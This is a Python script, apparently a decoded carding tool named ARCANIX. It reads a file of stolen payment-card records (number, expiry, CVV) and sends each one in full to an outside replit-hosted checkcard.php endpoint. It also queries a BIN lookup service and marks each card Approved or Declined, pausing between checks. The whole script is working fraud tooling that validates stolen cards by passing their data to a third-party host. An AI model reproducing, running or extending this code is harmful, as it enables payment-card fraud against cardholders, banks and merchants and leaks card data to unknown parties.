# DeCoDe By @H_S_W_M

import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import re
import time
import pyfiglet
import re
Z = '\x1b[1;31m'
F = '\x1b[2;32m'
B = '\x1b[2;36m'
X = '\x1b[1;33m'
C = '\x1b[2;35m'

def bin_data(biin):
    url = f'''https://lookup.binlist.net/{biin}'''
    
    try:
        req = requests.get(url=url).json()
        if 'scheme' in str(req):
            req = req
        else:
            req = 'ERROR'
    except:
        req = 'ERROR'
    return req



def checkcard(card, month, year, cvv):
    if '20' in str(year):
        year = year.replace('20', '')
    url = f'''https://preemptivenanospreadsheet--dz-elite-zoneel.repl.co/checkcard.php/id?cc={card}&mo={month}&yo={year}&cvv={cvv}'''
    header = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Host': 'preemptivenanospreadsheet--dz-elite-zoneel.repl.co',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"' }
    
    try:
        req = requests.get(url=url, headers=header).content
    except:
        req = 'ERROR'
    return req


logo = pyfiglet.figlet_format('                ARCANIX')
print('DeCoDe By @H_S_W_M')
print(Z + logo)
o = '____________________________________________________________'
print(F + o)
filee = input(Z + 'Enter Combo Name ==> ')
file = open(f'''{filee}''', '+r')
o = '____________________________________________________________'
print(F + o)
start_num = 0
for P in file.readlines():
    time.sleep(20)
    start_num += 1
    card = P.split('|')[0]
    month = P.split('|')[1]
    year = P.split('|')[2]
    cvv = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')
    check = checkcard(card=card, month=month, year=year, cvv=cvv)
    result = check.decode('utf-8')
    if 'NO REASN TO DECL' in result and 'APPROVAL' in result or 'CVV2 DECLINED' in result:
        print(F + f'''[{start_num}] - {card}|{month}|{year}|{cvv} ⇾  𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅  ⇾  {result}''')
        continue
    print(Z + f'''[{start_num}] - {card}|{month}|{year}|{cvv} ⇾  𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌  ⇾  {result}''')

